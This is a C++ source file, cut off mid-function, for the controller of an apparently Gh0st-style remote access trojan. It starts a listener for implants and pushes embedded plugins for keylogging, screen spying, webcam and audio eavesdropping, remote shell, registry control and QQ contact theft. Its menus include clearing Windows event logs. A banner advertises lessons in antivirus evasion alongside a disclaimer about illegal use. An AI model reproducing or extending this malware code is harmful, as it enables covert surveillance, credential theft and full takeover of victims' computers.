// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "Generate.h"
#include "Setting.h"
#include "LogView.h"
#include "Tools.h"

//////主功能
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "KeyBoardDlg.h"
#include "WebCamDlg.h"
#include "AudioDlg.h"
#include "ShellDlg.h"
#include "Systeminfo.h"
#include "SystemDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "QQInfoDlg.h"
#include "ProxyMapDlg.h"


/////////////////////////////////////////
#include "..\Bin\Plugins\C_FILE.h"
#include "..\Bin\Plugins\C_SCREEN.h"
#include "..\Bin\Plugins\C_KEYLOG.h"
#include "..\Bin\Plugins\C_VIDEO.h"
#include "..\Bin\Plugins\C_LISTEN.h"
#include "..\Bin\Plugins\C_SHELL.h"
#include "..\Bin\Plugins\C_SYSTEMINFO.h"
#include "..\Bin\Plugins\C_SYSTEM.h"
#include "..\Bin\Plugins\C_SERVICE.h"
#include "..\Bin\Plugins\C_REGEDIT.h"
#include "..\Bin\Plugins\C_CHAT.h"
#include "..\Bin\Plugins\C_QQINFO.h"
#include "..\Bin\Plugins\C_PROXYMAP.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif
#define WM_SYSTRAY						WM_USER+100
#define WM_ICONMESSAGE					WM_USER+100


//托盘左键
DWORD COM_Port;
CString strName;

/////////////////////////////////////////////////////////////////////////////
CMainFrame	*g_pFrame;
CIOCPServer * m_iocpServer = NULL;
extern CClientView* g_pTabView; 
extern CMySuperGrid* g_SuperGrid;
extern CLogView* g_pLogView;
/////////////////////////////////////////////////////////////////////////////
LPBYTE lpFilePacket = NULL;
LPBYTE lpScreenPacket = NULL;
LPBYTE lpKeyboardPacket = NULL;
LPBYTE lpWebCamPacket = NULL;
LPBYTE lpAudioPacket = NULL;
LPBYTE lpShellPacket = NULL;
LPBYTE lpSysteminfoPacket = NULL;
LPBYTE lpSystemPacket = NULL;
LPBYTE lpServicePacket = NULL;
LPBYTE lpRegeditPacket = NULL;
LPBYTE lpTextChatPacket = NULL;
LPBYTE lpQqinfoPacket = NULL;
LPBYTE lpProxyMapPacket = NULL;


int nFilePacketLength = 0;
int nScreenPacketLength = 0;
int nKeyboardPacketLength = 0;
int nWebCamPacketLength = 0;
int nAudioPacketLength = 0;
int nShellPacketLength = 0;
int nSysteminfoPacketLength = 0;
int nSystemPacketLength = 0;
int nServicePacketLength = 0;
int nRegeditPacketLength = 0;
int nTextChatPacketLength = 0;
int nQqinfoPacketLength = 0;
int nProxyPacketLength = 0;

// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()
	ON_WM_CLOSE()
	ON_WM_TIMER()
	ON_COMMAND(ID_BUILD, OnBuild)
	ON_COMMAND(ID_SETTING, OnSetting)
	ON_COMMAND(IDM_TOOLS, OnTools)
	ON_MESSAGE(WM_SYSTRAY,OnSystray)
	ON_COMMAND(IDM_NEWSTIPS, OnNewstips)
	ON_COMMAND(IDM_VOICEPROMPT, OnVoiceprompt)
	ON_COMMAND(IDM_SHOW, OnShow)
	ON_COMMAND(IDM_EXIT, OnExit)
	ON_COMMAND(ID_OPTIONS_STYLESYSTEM, OnOptionsSystem)
	ON_UPDATE_COMMAND_UI(ID_OPTIONS_STYLESYSTEM,OnUpdateOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnUpdateOptionsFont)
	ON_COMMAND_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnOptionsFont)
	ON_COMMAND(ID_OPTIONS_FRAMETHEME, OnFrameTheme)
	ON_UPDATE_COMMAND_UI(ID_OPTIONS_FRAMETHEME, OnUpdateFrameTheme)
	//}}AFX_MSG_MAP
	ON_XTP_CREATECONTROL()
	ON_COMMAND(IDM_IBBSOR_A, OnSz)
	ON_COMMAND(IDM_IBBSOR_B, OnSz)
	ON_COMMAND(IDM_IBBSOR_C, OnSz)
	ON_COMMAND(IDM_IBBSOR_D, OnSz)
	ON_COMMAND(IDM_IBBSOR_E, OnSz)
	
	ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_COMMAND_RANGE(ID_OPTIONS_STYLESCENIC7, ID_OPTIONS_STYLEWHITE, OnOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_STYLESCENIC7, ID_OPTIONS_STYLEWHITE, OnUpdateOptionsStyle)
	ON_UPDATE_COMMAND_UI_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnUpdateOptionsFont)
	ON_COMMAND_RANGE(ID_OPTIONS_FONT_SYSTEM, ID_OPTIONS_FONT_EXTRALARGE, OnOptionsFont)
	///////////////////以下是功能////////////////////////////
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMINFODIALOG, OnOpenSysteminfoDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
	ON_MESSAGE(WM_OPENQQINFODIALOG, OnOpenQqinfoDialog) 
	ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog) 

END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_OS,           // status line indicator
	ID_UPLOAD,
	ID_DOWNLOAD,
	ID_STAUTSPORT,
};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;//状态为this  不然小马断开的时候会导致程序崩溃
	memset(nOSCount,0,sizeof(nOSCount)); 

		TCHAR szStylesPath[_MAX_PATH];
	VERIFY(::GetModuleFileName(
		AfxGetApp()->m_hInstance, szStylesPath, _MAX_PATH));		
	
	CString csStylesPath(szStylesPath);
	int nIndex  = csStylesPath.ReverseFind(_T('\\'));
	if (nIndex > 0) {
		csStylesPath = csStylesPath.Left(nIndex);
	}
	else {
		csStylesPath.Empty();
	}
	m_csStylesPath += csStylesPath + _T("\\Styles\\");
	
	CString temp;
	temp += csStylesPath + _T("\\Styles");
	if (GetFileAttributes( temp ) == 0xFFFFFFFF)
	{	
		CreateDirectory( temp, NULL );
	}
	
	m_bChecked = FALSE;
	m_bAnimation = TRUE;
	m_bLayoutRTL = FALSE;
	
	ZeroMemory(&m_bOptions, sizeof(m_bOptions));
	
	
	// get path of executable	
	LPTSTR lpszExt = _tcsrchr(szStylesPath, '.');
	lstrcpy(lpszExt, _T(".xml"));
	
	m_strIniFileName = szStylesPath;
	
	m_nColumns = 0;
	
	m_pItemsShapes = 0;
	m_pItemsStyles = 0;
	m_pItemsStyleSet = 0;
	m_pItemsThemeColors = 0;
	m_pItemsThemeFonts = 0;
	m_pItemsFontTextColor = 0;
	m_pItemsFontBackColor = 0;
	m_pItemsFontFace = 0;
	m_pItemsFontSize = 0;
	m_pItemsColumns = 0;
	m_nUpCount = 0;
	m_nRibbonStyle = ID_OPTIONS_STYLEBLUE2007;

}

CMainFrame::~CMainFrame()
{
}

int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;

	//界面居中显示
	this ->CenterWindow(CWnd::GetDesktopWindow());

	// 初始化 command bars
	if (!InitCommandBars())
		return -1;
	
	// 获取 command bars 目标 指针
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}


//	SetMenu(NULL);//去除菜单

	//////////////////////////////////////////////////////////////////////////////////////
// 	if (!m_wndDlgBar.Create(this, IDD_DIALOGBAR, WS_VISIBLE|WS_CHILD|CBRS_SIZE_DYNAMIC|CBRS_ALIGN_TOP, IDD_DIALOGBAR)) 
// 	{ 
// 		TRACE0( "Failed to create dialogbar "); 
// 		return -1; 
// 	}

	//添加状态栏




	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		  sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}

		if (!CreateRibbonBar())
	{
		TRACE0("Failed to create ribbon\n");
		return -1;
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 121);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 121);
	m_wndStatusBar.SetPaneInfo(3, m_wndStatusBar.GetItemID(3), SBPS_NORMAL, 100);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

/*
		xtpThemeOffice2000,     // Office 2000 theme.
		xtpThemeOfficeXP,       // Office XP theme.
		xtpThemeOffice2003,     // Office 2003 theme.
		xtpThemeNativeWinXP,    // Windows XP themes support.
		xtpThemeWhidbey,        // Visual Studio 2005 theme.
		xtpThemeResource,       // Office 2007 theme.
		xtpThemeRibbon,         // Office 2007 style ribbon theme
		xtpThemeVisualStudio2008, // Visual Studio 2008 theme
		xtpThemeVisualStudio6,    // Visual Studio 6 theme
		xtpThemeVisualStudio2010, // Visual Studio 2010 theme
		xtpThemeCustom          // Custom theme.*/

	
	// 设置 主框架风格
 	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);

	//日志信息
	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005); // 设置主题
	CXTPDockingPane* pwndPaneLog = CreatePane(235, 160, RUNTIME_CLASS(CLogView), _T("日志信息"), xtpPaneDockBottom);

	pwndPaneLog->Select();
	pwndPaneLog->SetOptions(xtpPaneNoCaption);

	m_hDrawIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
    m_NotifyIcon.cbSize = sizeof(NOTIFYICONDATA); 
	m_NotifyIcon.hWnd = this->GetSafeHwnd(); 
	Host=0;
	NotifyIconTip();
	m_NotifyIcon.uCallbackMessage = WM_ICONMESSAGE; 
	m_NotifyIcon.uFlags = NIF_MESSAGE|NIF_TIP|NIF_ICON;
	m_NotifyIcon.hIcon = m_hDrawIcon;
	m_NotifyIcon.uID = IDR_MAINFRAME;
	Shell_NotifyIcon(NIM_ADD, &m_NotifyIcon);
	MinTray=NULL;  //桌面显示状态

	SetTimer(0, 1000, NULL);  //开启定时器 1

		pCommandBars->GetPaintManager()->m_bAutoResizeIcons = TRUE;
	
	pCommandBars->GetCommandBarsOptions()->bToolBarAccelTips = TRUE;
	
	pCommandBars->GetShortcutManager()->SetAccelerators(IDR_MAINFRAME);


		OSVERSIONINFO osvi;
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&osvi);
	bool bIsWindows2K3orLater = ( (osvi.dwMajorVersion == 6) && (osvi.dwMinorVersion == 1) );
		if (bIsWindows2K3orLater)
	{
		OnOptionsStyle(32870);
	}
	else
	{
		OnOptionsStyle(32875);
	}
		
	LoadCommandBars(_T("CommandBars"));

	CreateMessageBar("         Mandm远程管理系统,禁止用于一切非法用途,对使用者造成的一切损失,后果自负! 收徒学习免杀联系Qq794812423 ");

	LoadIcons();  //菜单图片显示

	// 文件管理
	nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
	lpFilePacket = new BYTE[nFilePacketLength];
	if(lpFilePacket == NULL)
	{
		AfxMessageBox("初始化File插件失败！");
	}
	else
	{
		lpFilePacket[0] = COMMAND_LIST_DRIVE;
		memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
	}

	// 屏幕控制
	nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
	lpScreenPacket = new BYTE[nScreenPacketLength];
	if(lpScreenPacket == NULL)
	{
		AfxMessageBox("初始化Screen插件失败！");
	}
	else
	{
		lpScreenPacket[0] = COMMAND_SCREEN_SPY;
		memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
	}
	
	// 键盘记录
	nKeyboardPacketLength = (KEYLOGMyFileSize + 1)*sizeof(char)+1;
	lpKeyboardPacket = new BYTE[nKeyboardPacketLength];
	if(lpKeyboardPacket == NULL)
	{
		AfxMessageBox("初始化Keyboard插件失败！");
	}
	else
	{
		lpKeyboardPacket[0] = COMMAND_KEYBOARD;
		memcpy(lpKeyboardPacket + 1, (void*)KEYLOGMyFileBuf, nKeyboardPacketLength - 1);
	}

	// 视频查看
	nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
	lpWebCamPacket = new BYTE[nWebCamPacketLength];
	if(lpWebCamPacket == NULL)
	{
		AfxMessageBox("初始化WebCam插件失败！");
	}
	else
	{
		lpWebCamPacket[0] = COMMAND_WEBCAM;
		memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
	}

	//语音监听
	nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
	lpAudioPacket = new BYTE[nAudioPacketLength];
	if(lpAudioPacket == NULL)
	{
		AfxMessageBox("初始化Audio插件失败！");
	}
	else
	{
		lpAudioPacket[0] = COMMAND_AUDIO;
		memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
	}

	//远程终端
	nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
	lpShellPacket = new BYTE[nShellPacketLength];
	if(lpShellPacket == NULL)
	{
		AfxMessageBox("初始化shell插件失败！");
	}
	else
	{
		lpShellPacket[0] = COMMAND_SHELL;
		memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
	}
	
	//系统信息
	nSysteminfoPacketLength = (SYSTEMINFOMyFileSize + 1)*sizeof(char)+1;
	lpSysteminfoPacket = new BYTE[nSysteminfoPacketLength];
	if(lpSysteminfoPacket == NULL)
	{
		AfxMessageBox("初始化systeminfo插件失败！");
	}
	else
	{
		lpSysteminfoPacket[0] = COMMAND_SYSTEMINFO;
		memcpy(lpSysteminfoPacket + 1, (void*)SYSTEMINFOMyFileBuf, nSysteminfoPacketLength - 1);
	}
	
	//系统管理
	nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
	lpSystemPacket = new BYTE[nSystemPacketLength];
	if(lpSystemPacket == NULL)
	{
		AfxMessageBox("初始化System插件失败！");
	}
	else
	{
		lpSystemPacket[0] = COMMAND_SYSTEM;
		memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
	}

	//服务管理
	nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
	lpServicePacket = new BYTE[nServicePacketLength];
	if(lpServicePacket == NULL)
	{
		AfxMessageBox("初始化Service插件失败！");
	}
	else
	{
		lpServicePacket[0] = COMMAND_SERVICE;
		memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
	}

	// 注册表
	nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
	lpRegeditPacket = new BYTE[nRegeditPacketLength];
	if(lpRegeditPacket == NULL)
	{
		AfxMessageBox("初始化Regedit插件失败！");
	}
	else
	{
		lpRegeditPacket[0] = COMMAND_REGEDIT;
		memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
	}
	
	// 远程聊天
	nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
	lpTextChatPacket = new BYTE[nTextChatPacketLength];
	if(lpTextChatPacket == NULL)
	{
		AfxMessageBox("初始化TextChat插件失败！");
	}
	else
	{
		lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
		memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
	}

	// 好友信息
	nQqinfoPacketLength = (QQINFOMyFileSize + 1)*sizeof(char)+1;
	lpQqinfoPacket = new BYTE[nQqinfoPacketLength];
	if(lpQqinfoPacket == NULL)
	{
		AfxMessageBox("初始化QQinfo插件失败！");
	}
	else
	{
		lpQqinfoPacket[0] = COMMAND_QQINFO;
		memcpy(lpQqinfoPacket + 1, (void*)QQINFOMyFileBuf, nQqinfoPacketLength - 1);
	}
	
	//代理映射
	nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
	lpProxyMapPacket = new BYTE[nProxyPacketLength];
	if(lpProxyMapPacket == NULL)
	{
		AfxMessageBox("初始化ProxyMap插件失败！");
	}
	else
	{
		lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
		memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
	}

	return 0;
}

void CMainFrame::LoadIcons()   //右键菜单显示图标
{

	CXTPCommandBars* pCommandBars = GetCommandBars();

	UINT uiGroupFind[] = {IDM_IBBSOR_A,IDM_IBBSOR_B,IDM_IBBSOR_C,IDM_IBBSOR_D,IDM_IBBSOR_E};

	UINT uiGroupFind2[] = {IDM_FILEMANAGER,IDM_SCREENSPY,IDM_KEYBOARD,IDM_WEBCAM,IDM_AUDIO,IDM_SHELL,IDM_SYSTEMINFO,IDM_SYSTEM,
		IDM_SERVICEMANAGER,IDM_REGEDIT
	};

	UINT uiGroupFind3[] = {IDM_MAP,IDM_SHOWMSG,IDM_TEXTCHAT,IDM_QQINFO,IDM_WEB,IDM_SELECT_ALL,IDM_UNSELECT_ALL
	};

	UINT uiGroupFind4[] = {ID_LOGOFF,ID_REBOOT,ID_SHUTDOWN,ID_UNINSTALL,ID_DOWNLOAD,ID_OPENWEB,ID_COPY_WANIP,ID_COPY_ALL,ID_CLEANEVENT_ALL,ID_CLEANEVENT_SYS,ID_CLEANEVENT_SECURITY,ID_CLEANEVENT_APP,ID_REMARK,ID_CHANGE_GROUP};
 	UINT uiGroupFind5[] = {IDM_START};
	UINT uiGroupFind6[] = {IDM_PROXY,IDM_PROXY_MAP};

    ////系统设置功能图标
	UINT uiGroupFind7[] = {ID_SETTING};
	UINT uiGroupFind8[] = {ID_BUILD};
	UINT uiGroupFind9[] = {ID_APP_ABOUT};
	UINT uiGroupFind10[] = {ID_APP_EXIT};



	XTPPaintManager()->SetTheme(xtpThemeRibbon);
	CXTPToolTipContext* pToolTipContext = GetCommandBars()->GetToolTipContext();
	pToolTipContext->SetStyle(xtpToolTipOffice2007);
	pToolTipContext->ShowTitleAndDescription();
	pToolTipContext->SetMargin(CRect(4, 4, 4, 4));
	pToolTipContext->SetMaxTipWidth(180);
// 	UINT uiGroupFind5[] = {IDM_IBBSOR_A,IDM_IBBSOR_B,IDM_IBBSOR_C,IDM_MAP,IDM_IBBSOR_D,IDM_IBBSOR_E,0};
// 
// 	UINT uiGroupFind6[] = {0,IDM_EVENT_DELETE,IDM_ALL_DELETE,IDM_EVENT_SAVE,IDM_EVENT_COPY,};  //日志管理
// 
// 	UINT uiGroupFind7[] = {IDM_DOWNEXEC,IDM_UPDATE_SERVER};  //下载功能IDM_START

	pCommandBars->GetImageManager()->SetIcons(IDB_MENU, uiGroupFind, _countof(uiGroupFind), CSize(16, 16));
 	pCommandBars->GetImageManager()->SetIcons(IDB_MENU2, uiGroupFind2, _countof(uiGroupFind2), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU3, uiGroupFind3, _countof(uiGroupFind3), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU4, uiGroupFind4, _countof(uiGroupFind4), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU5, uiGroupFind5, _countof(uiGroupFind5), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU6, uiGroupFind6, _countof(uiGroupFind6), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU7, uiGroupFind7, _countof(uiGroupFind7), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU8, uiGroupFind8, _countof(uiGroupFind8), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU9, uiGroupFind9, _countof(uiGroupFind9), CSize(16, 16));
	pCommandBars->GetImageManager()->SetIcons(IDB_MENU10, uiGroupFind10, _countof(uiGroupFind10), CSize(16, 16));
//	pCommandBars->GetImageManager()->SetIcons(IDB_TOOLS2, uiGroupFind6, _countof(uiGroupFind4), CSize(32, 32));
}

int CMainFrame::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
	if (lpCreateControl->bToolBar == FALSE)
 	{
		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("主机操作(&Z)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_A)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_A;
				return TRUE;
			}			
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("会话管理(&H)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_B)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_B;
				return TRUE;
			}
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("其他功能(&Q)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_C)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_C;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("清除日志(&U)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_D)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_D;
			}
			return TRUE;
		}

		if (lpCreateControl->controlType == xtpControlPopup && lpCreateControl->strCaption == _T("信息更改(&X)"))
		{
			if (lpCreateControl->nID != IDM_IBBSOR_E)
			{
				lpCreateControl->controlType = xtpControlPopup;
				lpCreateControl->buttonStyle = xtpButtonIconAndCaption;
				lpCreateControl->nID = IDM_IBBSOR_E;
			}
			return TRUE;
		}

 	}

     return FALSE;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CXTPFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs



	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));

	cs.cx = 1495;
	cs.cy = 766;
	cs.style &= ~FWS_ADDTOTITLE;
	//cs.style  &=~(WS_MAXIMIZEBOX|WS_THICKFRAME|FWS_ADDTOTITLE);   //去掉最大化窗口

	CString TextName;
	CString str;
	WSADATA wsaDataqq;
	WSAStartup(MAKEWORD(1,1),&wsaDataqq);//标题边显示ip
	PHOSTENT hostinfo;
	char name[512] = {0};
	if(gethostname (name,sizeof(name)) != 0 || (hostinfo = gethostbyname(name)) == NULL)
		return false;
	
	if (hostinfo != NULL)
	{ 
		for ( int i=0; ; i++ )
		{ 
			str += inet_ntoa(*(IN_ADDR*)hostinfo->h_addr_list[i]);
			if ( hostinfo->h_addr_list[i] + hostinfo->h_length >= hostinfo->h_name )
				break;
			str += "  ";
		}
	}
    WSACleanup();
	TextName.Format("%s", str);//改标题
	
	strName = "";
	cs.lpszName =TextName;

	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers

// 激活监听服务
void CMainFrame::StartIocp(int nPort, int nMaxConnections)
{

	HICON icon0 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_ICONOS),IMAGE_ICON, 16, 16, LR_SHARED);
	
	HICON icon1 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_ICONSEND),IMAGE_ICON, 16, 16, LR_SHARED);
	
	HICON icon2 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_ICONRECEIVE),IMAGE_ICON, 16, 16, LR_SHARED);
	
	HICON icon3 = (HICON)::LoadImage(AfxGetInstanceHandle(),
		MAKEINTRESOURCE(IDI_ICONPORT),IMAGE_ICON, 16, 16, LR_SHARED);
	
	//	CMainFrame* pFrm=(CMainFrame*)AfxGetApp()->m_pMainWnd;//得到主框架类指针
	CStatusBar* pStatus=&g_pFrame->m_wndStatusBar;//指针状态栏指针,m_wndStatusBar被我改成public属性了.
	if(pStatus)
	{ //加载图标的资源
		pStatus->GetStatusBarCtrl().SetIcon(0,icon0);
		pStatus->GetStatusBarCtrl().SetIcon(1,icon1);
		pStatus->GetStatusBarCtrl().SetIcon(2,icon2);
		pStatus->GetStatusBarCtrl().SetIcon(3,icon3);
		
	}

	

	//判断这个m_iocpServer全局变量是否已经指向了一个CIOCPServer
	if (m_iocpServer != NULL)
	{
		//如果是的话，就要先关闭它，并且删除掉这个CIOCPServer所占的内存空间
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;
	// 开始心跳
	m_iocpServer->m_nHeartBeatTime = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);
	



	CString str,IP,strLogText;

	str.Format("申明：欢迎使用本远程管理系统，对使用者造成的一切损失于作者无关");
	g_pLogView->InsertLogItem( str, 0, 0 );

	// 开启IPCP服务器
	if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort))
	{
		
		CString web;
		web.Format(_T("监听端口:%d"), nPort);
		m_wndStatusBar.SetPaneText(3, web);

		strLogText.Format( "系统成功启动 -> 监听端口: [%d]       ", nPort, Notice);
		g_pLogView->InsertLogItem( strLogText, 0, 1 );
			
	

		COM_Port = nPort;
	}
	else
	{
		str.Format(_T("端口 %d 监听失败"), nPort);
		strLogText.Format( "系统成功启动 -> 监听端口: [ %d ]", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 2 );

		AfxMessageBox(str);
		ShowWindow(SW_SHOW);
		UpdateWindow();
		m_wndStatusBar.SetPaneText(3, str);
	}
	
	NotifyIconTip();   //托盘信息显示
	Shell_NotifyIcon(NIM_MODIFY,&m_NotifyIcon);
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode )
{
	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		break;
	case NC_CLIENT_DISCONNECT:
		g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
		break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
		break;
	default:
		break;
	}
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEMINFO_DLG:
			((CSysteminfo *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVICE_DLG:
			((CServiceDlg *)dlg)->OnReceiveComplete();
